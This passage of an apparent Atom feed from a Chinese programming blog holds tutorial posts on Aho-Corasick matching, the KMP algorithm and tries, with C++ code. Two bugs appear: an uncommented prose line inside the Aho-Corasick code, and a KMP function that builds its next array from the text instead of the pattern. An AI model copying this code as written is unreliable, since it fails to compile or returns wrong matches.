class=&#34;line&#34;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;71&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;72&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;73&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;74&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;75&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;76&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;77&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;78&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;79&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;80&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;81&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;82&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;83&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;84&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;85&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;86&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;87&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#include &amp;lt;queue&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#include &amp;lt;cstdlib&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#include &amp;lt;cmath&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#include &amp;lt;cstdio&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#include &amp;lt;string&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#include &amp;lt;cstring&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#include &amp;lt;iostream&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#include &amp;lt;algorithm&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;using namespace std;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;typedef long long ll;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;const int maxn =  2*1e6+9;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;int trie[maxn][26]; //字典树&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;int cntword[maxn];  //记录该单词出现次数&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;int fail[maxn];     //失败时的回溯指针&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;int cnt = 0;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;void insertWords(string s)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    int root = 0;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    for(int i=0;i&amp;lt;s.size();i++)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        int next = s[i] - &amp;#x27;a&amp;#x27;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        if(!trie[root][next])&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            trie[root][next] = ++cnt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        root = trie[root][next];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    cntword[root]++;      //当前节点单词数+1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;void getFail()&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    queue &amp;lt;int&amp;gt;q;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    for(int i=0;i&amp;lt;26;i++)&amp;#123;      //将第二层所有出现了的字母扔进队列&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        if(trie[0][i])&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            fail[trie[0][i]] = 0;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            q.push(trie[0][i]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;//fail[now]    -&amp;gt;当前节点now的失败指针指向的地方&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;tire[now][i] -&amp;gt; 下一个字母为i+&amp;#x27;a&amp;#x27;的节点的下标为tire[now][i]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    while(!q.empty())&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        int now = q.front();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        q.pop();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        for(int i=0;i&amp;lt;26;i++)&amp;#123;      //查询26个字母&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            if(trie[now][i])&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                //如果有这个子节点为字母i+&amp;#x27;a&amp;#x27;,则&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;//让这个节点的失败指针指向(((他父亲节点)的失败指针所指向的那个节点)的下一个节点)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                //有点绕,为了方便理解特意加了括号&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                fail[trie[now][i]] = trie[fail[now]][i];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                q.push(trie[now][i]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            else//否则就让当前节点的这个子节点&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                //指向当前节点fail指针的这个子节点&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                trie[now][i] = trie[fail[now]][i];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;int query(string s)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    int now = 0,ans = 0;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    for(int i=0;i&amp;lt;s.size();i++)&amp;#123;    //遍历文本串&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        now = trie[now][s[i]-&amp;#x27;a&amp;#x27;];  //从s[i]点开始寻找&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        for(int j=now;j &amp;amp;&amp;amp; cntword[j]!=-1;j=fail[j])&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            //一直向下寻找,直到匹配失败(失败指针指向根或者当前节点已找过).&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            ans += cntword[j];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            cntword[j] = -1;    //将遍历国后的节点标记,防止重复计算&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    return ans;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;int main() &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    int n;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    string s;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    cin &amp;gt;&amp;gt; n;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    for(int i=0;i&amp;lt;n;i++)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        cin &amp;gt;&amp;gt; s ;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        insertWords(s);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    fail[0] = 0;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    getFail();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    cin &amp;gt;&amp;gt; s ;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    cout &amp;lt;&amp;lt; query(s) &amp;lt;&amp;lt; endl;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    return 0;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</content>
        <updated>2023-01-13T20:00:23.000Z</updated>
    </entry>
    <entry>
        <id>https://mangpumo.github.io/2023/01/14/CPP%E7%9A%84KMP%E7%AE%97%E6%B3%95/</id>
        <title>CPP的KMP算法</title>
        <link rel="alternate" href="https://mangpumo.github.io/2023/01/14/CPP%E7%9A%84KMP%E7%AE%97%E6%B3%95/"/>
        <content type="html">&lt;h1 id=&#34;1-kmp算法简介&#34;&gt;&lt;a href=&#34;#1-kmp算法简介&#34; class=&#34;headerlink&#34; title=&#34;1.kmp算法简介&#34;&gt;&lt;/a&gt;1.kmp算法简介&lt;/h1&gt;&lt;p&gt;KMP是三位大牛：D.E.Knuth、J.H.Morris和V.R.Pratt同时发现的。&lt;br&gt;KMP算法其实就是一种改进的字符串匹配算法，关键是利用匹配后失败的信息，尽量减少模式串（W）与主串（T）的匹配次数以达到快速匹配的目的。具体实现就是实现一个next() 函数，函数本身包含了模式串的局部匹配信息。时间复杂度 O(m+n)。&lt;br&gt;如果考虑最笨的方法，我们可以将T[0]和W[0]进行匹配，如果相同则匹配下一个字符，直到出现不相同的情况，此时我们会丢弃前面的匹配信息，然后把T[1]跟W[0]匹配，循环进行，直到主串结束，或者出现匹配成功的情况。这种丢弃前面的匹配信息的方法，时间复杂度为O(m*n)。&lt;br&gt;KMP算法利用已经部分匹配这个有效信息，保持i指针（主串）不回溯，通过修改j指针，让模式串尽量地移动到有效的位置，具体可见下面一个例子。&lt;br&gt;如果主串为：a b c a b c d h i j k&lt;br&gt;模式串为：a b c e&lt;br&gt;当我们匹配到主串的第四个字符a时，可知a和e不相等，因此需要移向下一位，但其实我们并不需要从模式串中的第一位重新开始比较，因为主串中的前三个字符已经没有未匹配的a了，不可能匹配成功。  &lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2018/01/30/5a706e671dc4d.jpg&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;2-next（）函数&#34;&gt;&lt;a href=&#34;#2-next（）函数&#34; class=&#34;headerlink&#34; title=&#34;2.next（）函数&#34;&gt;&lt;/a&gt;2.next（）函数&lt;/h1&gt;&lt;p&gt;因此，最关键的是找到如何移动j指针。我们记当匹配失败时，j要移动的下一个位置为k（即next[j]&amp;#x3D; k)。记P为模式串。&lt;br&gt;很显然，存在这样一个性质：最前面的k个位置（对于模式串来说）和j之前的最后k个字符（主串）是一样的。因此得到公式：  &lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;P[0 ~ k-1] == P[j-k ~ j-1]&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;当P[k] &amp;#x3D;&amp;#x3D; p[j]时  &lt;/p&gt;
&lt;p&gt;有P[0 ~ k-1] + P[k] &amp;#x3D;&amp;#x3D; p[j-k ~ j-1] + P[j]，即：P[0 ~ k] &amp;#x3D;&amp;#x3D; P[j-k ~ j]，因此可得&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;next[j+1] == k + 1 == next[j] + 1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;当P[k] !&amp;#x3D; p[j]时&lt;/p&gt;
&lt;p&gt;我们只能在0~k-1中去寻找最长后缀串了，因此为&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;k = next[k]&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;使用C++ 实现next函数为&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;int* getNext(string p)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    int* next = new int[p.length()];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    next[0] = -1;           //while the first char not match, i++,j++&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    int j = 0;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    int k = -1;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    while (j &amp;lt; (int)p.length() - 1)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        if (k == -1 || p[j] == p[k])&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            j++;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            k++;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            next[j] = k;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        else&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            k = next[k];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    return next;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h1 id=&#34;3-完整算法&#34;&gt;&lt;a href=&#34;#3-完整算法&#34; class=&#34;headerlink&#34; title=&#34;3.完整算法&#34;&gt;&lt;/a&gt;3.完整算法&lt;/h1&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;int KMP(string T,string p)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    int i=0;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    int j=0;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    int* next=getNext(T);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    while (i &amp;lt; (int)T.length() &amp;amp;&amp;amp; j &amp;lt; (int)p.length())&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        if (j == -1 || T[i] == p[j])&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            i++;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            j++;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        else&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            j=next[j];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    if (j == (int)p.length())&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        return i-j;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    return -1;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</content>
        <updated>2023-01-13T19:50:50.000Z</updated>
    </entry>
    <entry>
        <id>https://mangpumo.github.io/2023/01/14/%E5%AD%97%E5%85%B8%E6%A0%91%E5%8F%8A%E5%85%B6CPP%E5%AE%9E%E7%8E%B0/</id>
        <title>字典树及其CPP实现</title>
        <link rel="alternate" href="https://mangpumo.github.io/2023/01/14/%E5%AD%97%E5%85%B8%E6%A0%91%E5%8F%8A%E5%85%B6CPP%E5%AE%9E%E7%8E%B0/"/>
        <content type="html">&lt;h1 id=&#34;1、什么是Trie树（参考）&#34;&gt;&lt;a href=&#34;#1、什么是Trie树（参考）&#34; class=&#34;headerlink&#34; title=&#34;1、什么是Trie树（参考）&#34;&gt;&lt;/a&gt;1、什么是Trie树（参考）&lt;/h1&gt;&lt;p&gt;rie树，即字典树，又称单词查找树或键树，是一种树形结构，是一种哈希树的变种。典型应用是用于统计和排序大量的字符串（但不仅限于字符串），所以经常被搜索引擎系统用于文本词频统计。它的优点是：最大限度地减少无谓的字符串比较，查询效率比哈希表高。Trie的核心思想是空间换时间。利用字符串的公共前缀来降低查询时间的开销以达到提高效率的目的。&lt;/p&gt;
&lt;h2 id=&#34;字典树3个基本性质：&#34;&gt;&lt;a href=&#34;#字典树3个基本性质：&#34; class=&#34;headerlink&#34; title=&#34;字典树3个基本性质：&#34;&gt;&lt;/a&gt;字典树3个基本性质：&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;根节点不包含字符，除根节点外每一个节点都只包含一个字符。&lt;/li&gt;
&lt;li&gt;从根节点到某一节点，路径上经过的字符连接起来，为该节点对应的字符串。&lt;/li&gt;
&lt;li&gt;每个节点的所有子节点包含的字符都不相同。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;假设有b，abc，abd，bcd，abcd，efg，hii 这6个单词，我们构建的树就是如下图这样的：&lt;br&gt;&lt;img data-src=&#34;https://img-blog.csdnimg.cn/20190408163008821.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L01PVV9JVA==,size_16,color_FFFFFF,t_70&#34;&gt;&lt;/p&gt;
&lt;p&gt;如上图所示，对于每一个节点，从根遍历到他的过程就是一个单词，如果这个节点被标记为红色，就表示这个单词存在，否则不存在。那么，对于一个单词，我只要顺着他从根走到对应的节点，再看这个节点是否被标记为红色就可以知道它是否出现过了。把这个节点标记为红色，就相当于插入了这个单词。这样一来我们查询和插入可以一起完成，所用时间仅仅为单词长度，在这一个样例，便是10。我们可以看到，trie树每一层的节点数是26^i级别的。所以为了节省空间。我们用动态链表，或者用数组来模拟动态。空间的花费，不会超过单词数×单词长度。&lt;/p&gt;
&lt;h2 id=&#34;字典树的查询：&#34;&gt;&lt;a href=&#34;#字典树的查询：&#34; class=&#34;headerlink&#34; title=&#34;字典树的查询：&#34;&gt;&lt;/a&gt;字典树的查询：&lt;/h2&gt;&lt;p&gt;使用trie时，因为当查询如字符串abc是否为某个字符串的前缀时，显然以b,c,d….等不是以a开头的字符串就不用查找了。所以建立trie的复杂度为O(n&lt;em&gt;len)，而建立+查询在trie中是可以同时执行的，建立的过程也就可以成为查询的过程，hash就不能实现这个功能。所以总的复杂度为O(n&lt;/em&gt;len)，实际查询的复杂度也只是O(len)。（说白了，就是Trie树的平均高度h为len，所以Trie树的查询复杂度为O（h）&amp;#x3D;O（len））。&lt;/p&gt;
&lt;h2 id=&#34;字典树优缺点：&#34;&gt;&lt;a href=&#34;#字典树优缺点：&#34; class=&#34;headerlink&#34; title=&#34;字典树优缺点：&#34;&gt;&lt;/a&gt;字典树优缺点：&lt;/h2&gt;&lt;h3 id=&#34;优点：&#34;&gt;&lt;a href=&#34;#优点：&#34; class=&#34;headerlink&#34; title=&#34;优点：&#34;&gt;&lt;/a&gt;优点：&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;插入，查询，删除等操作复杂度为O(h),其中h为单词的长度。为什么会这么快呢，本质是空间换时间（空间复杂度为26的h次方），利用指针来避免做其他不必要的查找。（初始化的时间复杂度为 n*O(h)，n为单词个数）；&lt;/li&gt;
&lt;li&gt;当储存大量单词或者说储存的单词有着共同前缀时节省了空间。（比如说用线性存储boy,boyfriend如用trie存储的差别）；&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;缺点：&#34;&gt;&lt;a href=&#34;#缺点：&#34; class=&#34;headerlink&#34; title=&#34;缺点：&#34;&gt;&lt;/a&gt;缺点：&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;指针占用的空间，空间复杂度大。如果储存少量的单词，并不能节省空间&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;字典树的应用：&#34;&gt;&lt;a href=&#34;#字典树的应用：&#34; class=&#34;headerlink&#34; title=&#34;字典树的应用：&#34;&gt;&lt;/a&gt;字典树的应用：&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;字符串检索：事先将已知的一些字符串（字典）的有关信息保存到trie树里，查找另外一些未知字符串是否出现过或者出现频率。&lt;/li&gt;
